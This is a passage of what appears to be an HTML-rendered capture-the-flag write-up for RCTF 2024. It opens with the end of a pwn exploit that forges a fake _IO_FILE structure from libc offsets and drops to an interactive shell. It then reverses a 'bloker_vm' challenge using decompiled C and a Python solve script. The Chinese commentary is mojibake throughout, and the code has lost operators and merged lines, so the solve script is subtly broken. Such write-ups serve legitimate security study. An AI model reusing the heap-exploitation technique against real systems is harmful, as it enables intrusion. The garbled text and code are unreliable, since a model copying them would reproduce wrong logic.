</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x1da1c2</span><span class=p>)</span><span class=o>*</span><span class=mi>13</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>IO_2_1_stderr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>12</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>=</span> <span class=n>fake_IO_FILE</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>=</span> <span class=n>fake_IO_FILE</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>IO_2_1_stderr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>=</span> <span class=n>fake_IO_FILE</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xa0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x21b110</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>=</span> <span class=n>fake_IO_FILE</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xc0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>=</span> <span class=n>fake_IO_FILE</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xd8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x2170f0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_IO_FILE</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xfbad2887</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>fake_IO_FILE</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>meau</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=reverse>reverse</h1><h2 id=bloker_vm>bloker_vm</h2><p>ç¨‹åºçš„æ•´ä½“é€»è¾‘æ˜¯çˆ¶è¿›ç¨‹åˆ›å»ºäº†å­è¿›ç¨‹ï¼Œä¸”æ¥ç®¡å­è¿›ç¨‹çš„å¼‚å¸¸ç›¸å…³ä¿¡æ¯å¹¶å¤„ç†ï¼Œç›¸å½“äºçˆ¶è¿›ç¨‹æ˜¯ä½œä¸ºå­è¿›ç¨‹çš„è°ƒè¯•å™¨ï¼Œè¿™æ ·æˆ‘ä»¬ç›´æ¥è°ƒè¯•å­è¿›ç¨‹äº†ã€‚</p><p>çˆ¶è¿›ç¨‹é€»è¾‘</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>int</span> <span class=nf>sub_551A10</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=n>HMODULE</span> <span class=n>ModuleHandleW</span><span class=p>;</span> <span class=c1>// eaxchar v1; // alchar LastError; // alint v4; // eaxchar v5; // [esp+0h] [ebp-A5Ch]char v6; // [esp+0h] [ebp-A5Ch]char v7; // [esp+0h] [ebp-A5Ch]unsigned int k; // [esp+320h] [ebp-73Ch]void *lpBaseAddress; // [esp+32Ch] [ebp-730h]size_t j; // [esp+338h] [ebp-724h]size_t i; // [esp+344h] [ebp-718h]int v12; // [esp+350h] [ebp-70Ch]int v13; // [esp+35Ch] [ebp-700h]char Buffer[264]; // [esp+3A4h] [ebp-6B8h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>CONTEXT</span> <span class=n>Context</span><span class=p>;</span> <span class=c1>// [esp+4ACh] [ebp-5B0h] BYREFstruct _DEBUG_EVENT DebugEvent; // [esp+780h] [ebp-2DCh] BYREFstruct _PROCESS_INFORMATION ProcessInformation; // [esp+7E8h] [ebp-274h] BYREFstruct _STARTUPINFOW StartupInfo; // [esp+800h] [ebp-25Ch] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>WCHAR</span> <span class=n>Filename</span><span class=p>[</span><span class=mi>262</span><span class=p>];</span> <span class=c1>// [esp+84Ch] [ebp-210h] BYREF__CheckForDebuggerJustMyCode(&amp;unk_55D0AC);j_memset(Filename, 0, 0x208u);
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>StartupInfo</span><span class=p>.</span><span class=n>cb</span> <span class=o>=</span> <span class=mi>68</span><span class=p>;</span><span class=nf>j_memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>StartupInfo</span><span class=p>.</span><span class=n>lpReserved</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x40u</span><span class=p>);</span><span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>ProcessInformation</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>));</span><span class=nf>j_memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>DebugEvent</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>DebugEvent</span><span class=p>));</span><span class=nf>j_memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Context</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>Context</span><span class=p>));</span><span class=nf>j_memset</span><span class=p>(</span><span class=n>Buffer</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0xFFu</span><span class=p>);</span><span class=nf>sub_5510EB</span><span class=p>(</span><span class=s>&#34;please input your flag:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v5</span><span class=p>);</span><span class=nf>sub_551037</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=p>)</span><span class=n>Str</span><span class=p>);</span><span class=k>if</span> <span class=p>(</span> <span class=nf>j_strlen</span><span class=p>(</span><span class=n>Str</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>25</span> <span class=p>)</span><span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>Str</span><span class=p>[</span><span class=mi>25</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>ModuleHandleW</span> <span class=o>=</span> <span class=nf>GetModuleHandleW</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span><span class=nf>GetModuleFileNameW</span><span class=p>(</span><span class=n>ModuleHandleW</span><span class=p>,</span> <span class=n>Filename</span><span class=p>,</span> <span class=mh>0x104u</span><span class=p>);</span><span class=k>if</span> <span class=p>(</span> <span class=nf>CreateProcessW</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>Filename</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>3u</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>StartupInfo</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ProcessInformation</span><span class=p>)</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>v13</span> <span class=o>=</span> <span class=o>-</span><span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v12</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span><span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>){</span><span class=nf>j_memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>DebugEvent</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>DebugEvent</span><span class=p>));</span><span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nf>WaitForDebugEvent</span><span class=p>(</span><span class=o>&amp;</span><span class=n>DebugEvent</span><span class=p>,</span> <span class=mh>0xFFFFFFFF</span><span class=p>)</span> <span class=p>)</span><span class=k>break</span><span class=p>;</span><span class=k>if</span> <span class=p>(</span> <span class=n>DebugEvent</span><span class=p>.</span><span class=n>dwDebugEventCode</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>){</span><span class=k>switch</span> <span class=p>(</span> <span class=n>DebugEvent</span><span class=p>.</span><span class=n>u</span><span class=p>.</span><span class=n>Exception</span><span class=p>.</span><span class=n>ExceptionRecord</span><span class=p>.</span><span class=n>ExceptionCode</span> <span class=p>){</span><span class=k>case</span> <span class=mh>0xC0000094</span><span class=o>:</span><span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nf>j_strlen</span><span class=p>(</span><span class=n>Str</span><span class=p>);</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span><span class=c1>// EXCEPTION_INT_DIVIDE_BY_ZERO
</span></span></span><span class=line><span class=cl><span class=c1></span>              <span class=n>Str</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=mh>0x7Du</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>Context</span><span class=p>.</span><span class=n>ContextFlags</span> <span class=o>=</span> <span class=mi>65543</span><span class=p>;</span><span class=nf>GetThreadContext</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Context</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>Context</span><span class=p>.</span><span class=n>Eip</span> <span class=o>+=</span> <span class=mi>2</span><span class=p>;</span><span class=nf>SetThreadContext</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Context</span><span class=p>);</span><span class=k>break</span><span class=p>;</span><span class=k>case</span> <span class=mh>0xC0000096</span><span class=o>:</span><span class=k>for</span> <span class=p>(</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=nf>j_strlen</span><span class=p>(</span><span class=n>Str</span><span class=p>);</span> <span class=o>++</span><span class=n>j</span> <span class=p>)</span><span class=c1>// EXCEPTION_PRIV_INSTRUCTION
</span></span></span><span class=line><span class=cl><span class=c1></span>              <span class=n>byte_55B26C</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>Str</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>6</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>Str</span><span class=p>[</span><span class=n>j</span><span class=p>]</span>  <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x3F</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>Context</span><span class=p>.</span><span class=n>ContextFlags</span> <span class=o>=</span> <span class=mi>65543</span><span class=p>;</span><span class=nf>GetThreadContext</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Context</span><span class=p>);</span><span class=o>++</span><span class=n>Context</span><span class=p>.</span><span class=n>Eip</span><span class=p>;</span><span class=nf>SetThreadContext</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Context</span><span class=p>);</span><span class=k>break</span><span class=p>;</span><span class=k>case</span> <span class=mh>0xC000008E</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=n>Context</span><span class=p>.</span><span class=n>ContextFlags</span> <span class=o>=</span> <span class=mi>65543</span><span class=p>;</span>       <span class=c1>// EXCEPTION_FLT_DIVIDE_BY_ZEROGetThreadContext(ProcessInformation.hThread, &amp;Context);
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>Context</span><span class=p>.</span><span class=n>Eip</span> <span class=o>+=</span> <span class=mi>4</span><span class=p>;</span><span class=nf>SetThreadContext</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Context</span><span class=p>);</span><span class=k>break</span><span class=p>;</span><span class=k>case</span> <span class=mh>0xC0000005</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=n>v4</span> <span class=o>=</span> <span class=nf>j_strlen</span><span class=p>(</span><span class=n>Str</span><span class=p>);</span>                 <span class=c1>// EXCEPTION_ACCESS_VIOLATIONsub_55100F((int)byte_55B26C, v4, (int)aThisisyoursecr, 18);
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>Context</span><span class=p>.</span><span class=n>ContextFlags</span> <span class=o>=</span> <span class=mi>65543</span><span class=p>;</span><span class=nf>GetThreadContext</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Context</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>Context</span><span class=p>.</span><span class=n>Eip</span> <span class=o>+=</span> <span class=mi>2</span><span class=p>;</span><span class=nf>SetThreadContext</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Context</span><span class=p>);</span><span class=k>break</span><span class=p>;</span><span class=k>case</span> <span class=mh>0x80000003</span><span class=o>:</span><span class=k>if</span> <span class=p>(</span> <span class=o>++</span><span class=n>v13</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span>                    <span class=c1>// EXCEPTION_BREAKPOINT{if ( v13 == -1 ){
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=n>Context</span><span class=p>.</span><span class=n>ContextFlags</span> <span class=o>=</span> <span class=mi>65543</span><span class=p>;</span><span class=nf>GetThreadContext</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Context</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>lpBaseAddress</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>Context</span><span class=p>.</span><span class=n>Eip</span><span class=p>;</span><span class=nf>SetThreadContext</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Context</span><span class=p>);</span><span class=nf>ReadProcessMemory</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>lpBaseAddress</span><span class=p>,</span> <span class=n>Buffer</span><span class=p>,</span> <span class=mh>0xD6u</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span><span class=k>for</span> <span class=p>(</span> <span class=n>k</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>k</span> <span class=o>&lt;</span> <span class=mh>0xD6</span><span class=p>;</span> <span class=o>++</span><span class=n>k</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                  <span class=n>Buffer</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>^=</span> <span class=mh>0x44u</span><span class=p>;</span><span class=nf>WriteProcessMemory</span><span class=p>(</span><span class=n>ProcessInformation</span><span class=p>.</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>lpBaseAddress</span><span class=p>,</span> <span class=n>Buffer</span><span class=p>,</span> <span class=mh>0xD6u</span><span class=p>,</span> <span class=mi>0</span><span class=p>);}}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=n>v12</span> <span class=o>=</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>byte_55B26C</span><span class=p>[</span><span class=n>v13</span><span class=p>]</span> <span class=o>==</span> <span class=n>dword_55B018</span><span class=p>[</span><span class=n>v13</span><span class=p>])</span> <span class=o>&amp;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>v12</span><span class=p>;}</span><span class=k>break</span><span class=p>;}}</span><span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>DebugEvent</span><span class=p>.</span><span class=n>dwDebugEventCode</span> <span class=o>==</span> <span class=mi>5</span> <span class=p>){</span><span class=k>goto</span> <span class=n>LABEL_34</span><span class=p>;}</span><span class=nf>ContinueDebugEvent</span><span class=p>(</span><span class=n>DebugEvent</span><span class=p>.</span><span class=n>dwProcessId</span><span class=p>,</span> <span class=n>DebugEvent</span><span class=p>.</span><span class=n>dwThreadId</span><span class=p>,</span> <span class=mh>0x10002u</span><span class=p>);}</span>
</span></span><span class=line><span class=cl>    <span class=n>LastError</span> <span class=o>=</span> <span class=nf>GetLastError</span><span class=p>();</span><span class=nf>sub_5510EB</span><span class=p>(</span><span class=s>&#34;WaitForDebugEvent() failed! [%d]n&#34;</span><span class=p>,</span> <span class=n>LastError</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nl>LABEL_34</span><span class=p>:</span><span class=nf>sub_5510EB</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v6</span><span class=p>);</span><span class=k>if</span> <span class=p>(</span> <span class=n>v12</span> <span class=p>)</span><span class=k>return</span> <span class=nf>sub_5510EB</span><span class=p>(</span><span class=s>&#34;Congratulations! flag is your input</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v7</span><span class=p>);</span><span class=n>elsereturn</span> <span class=nf>sub_5510EB</span><span class=p>(</span><span class=s>&#34;try again</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v7</span><span class=p>);}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v1</span> <span class=o>=</span> <span class=nf>GetLastError</span><span class=p>();</span><span class=k>return</span> <span class=nf>sub_5510EB</span><span class=p>(</span><span class=s>&#34;CreateProcess()</span> <span class=n>failed</span><span class=o>!</span> <span class=p>[</span><span class=o>%</span><span class=n>d</span><span class=p>]</span><span class=n>n</span><span class=s>&#34;, v1)</span><span class=p>;}}</span><span class=cm>/* Orphan comments:
</span></span></span><span class=line><span class=cl><span class=cm>EXCEPTION_INT_DIVIDE_BY_ZERO
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span></code></pre></td></tr></table></div></div><p>å…³é”®åœ¨äºå…¶ä¸­çš„å‡ ä¸ªå¤„ç†å­è¿›ç¨‹å¼‚å¸¸çš„é€»è¾‘</p><p><img src=/img/2024-05-27-RCTF/fd3463bb362f4d232b2a7d0a4a2ce55b.png alt></p><p>å­è¿›ç¨‹ä¸­å°±è§¦å‘ä¸åŒçš„å¼‚å¸¸æ¥æ¨åŠ¨çˆ¶è¿›ç¨‹çš„æ‰§è¡Œï¼Œæ¯”å¦‚ä¸‹é¢å¼€å§‹çš„CCå°±æ˜¯ä¸€ä¸ªè½¯ä»¶æ–­ç‚¹å¼‚å¸¸</p><p><img src=/img/2024-05-27-RCTF/06e323b3c9af628266176d7bb501f9cc.png alt></p><p>è¿™æ ·çˆ¶è¿›ç¨‹ä¸­å°±ä¼šæ¥ç®¡è¿™ä¸ªå¼‚å¸¸ï¼Œå¹¶å¯¹å­è¿›ç¨‹ä¸­çš„ä»£ç è¿›è¡Œè§£å¯†</p><p><img src=/img/2024-05-27-RCTF/3e74199dbbf6e1890124459e4c20f885.png alt></p><p>å‰©ä¸‹çš„æµç¨‹å¯ä»¥ç›´æ¥è°ƒè¯•çˆ¶è¿›ç¨‹æ¥ç¡®å®šï¼Œ</p><p>å…ˆå¯¹è¾“å…¥è¿›è¡Œäº†å¼‚æˆ–</p><p><img src=/img/2024-05-27-RCTF/3cd1bb2e6c5a427d115600c3f0d27f9f.png alt></p><p>æ¥ç€è¿›è¡Œç§»ä½è¿ç®—</p><p><img src=/img/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png alt></p><p>ç„¶åæ˜¯ä¸€ä¸ªrc4</p><p><img src=/img/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png alt></p><p>æœ€åå¯¹æ¯”</p><p><img src=/img/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png alt></p><p>ä¸€å±‚ä¸€å±‚é€†å‘è§£å¯†å³å¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x00000080</span><span class=p>,</span> <span class=mh>0x00000005</span><span class=p>,</span> <span class=mh>0x000000E3</span><span class=p>,</span> <span class=mh>0x0000002F</span><span class=p>,</span> <span class=mh>0x00000018</span><span class=p>,</span> <span class=mh>0x0000002F</span><span class=p>,</span> <span class=mh>0x000000C5</span><span class=p>,</span> <span class=mh>0x0000008C</span><span class=p>,</span> <span class=mh>0x00000025</span><span class=p>,</span> <span class=mh>0x00000070</span><span class=p>,</span> <span class=mh>0x000000BC</span><span class=p>,</span> <span class=mh>0x00000005</span><span class=p>,</span> <span class=mh>0x0000001C</span><span class=p>,</span> <span class=mh>0x0000004F</span><span class=p>,</span> <span class=mh>0x000000F2</span><span class=p>,</span> <span class=mh>0x00000002</span><span class=p>,</span> <span class=mh>0x000000E5</span><span class=p>,</span> <span class=mh>0x0000003E</span><span class=p>,</span> <span class=mh>0x00000002</span><span class=p>,</span> <span class=mh>0x0000002F</span><span class=p>,</span> <span class=mh>0x000000E5</span><span class=p>,</span> <span class=mh>0x00000011</span><span class=p>,</span> <span class=mh>0x000000A3</span><span class=p>,</span> <span class=mh>0x000000C0</span><span class=p>,</span> <span class=mh>0x00000000</span><span class=p>]</span><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>enc</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>x1</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xD8</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0xBB</span><span class=p>,</span> <span class=mh>0xDE</span><span class=p>,</span> <span class=mh>0xD8</span><span class=p>,</span> <span class=mh>0xB1</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x1E</span><span class=p>,</span> <span class=mh>0xC9</span><span class=p>,</span> <span class=mh>0xDA</span><span class=p>,</span> <span class=mh>0xA6</span><span class=p>,</span> <span class=mh>0x93</span><span class=p>,</span> <span class=mh>0xF0</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span> <span class=mh>0xF8</span><span class=p>,</span> <span class=mh>0xF2</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=mh>0x95</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>x2</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s2>&#34;93939393939393939393939393939393939393939393939393&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>x</span> <span class=o>=</span> <span class=p>[</span><span class=n>x1</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>^</span><span class=n>x2</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>x1</span><span class=p>))]</span><span class=nb>print</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=p>[</span><span class=n>enc</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>^</span><span class=n>x</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>enc</span><span class=p>))]</span> 
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>enc</span><span class=p>)</span><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>enc</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>enc</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>enc</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>  <span class=mi>6</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>enc</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>enc</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;=</span> <span class=mh>0xfff</span><span class=ow>or</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>enc</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>enc</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=mh>0x7D</span><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>enc</span><span class=p>))</span><span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>enc</span><span class=p>))</span>
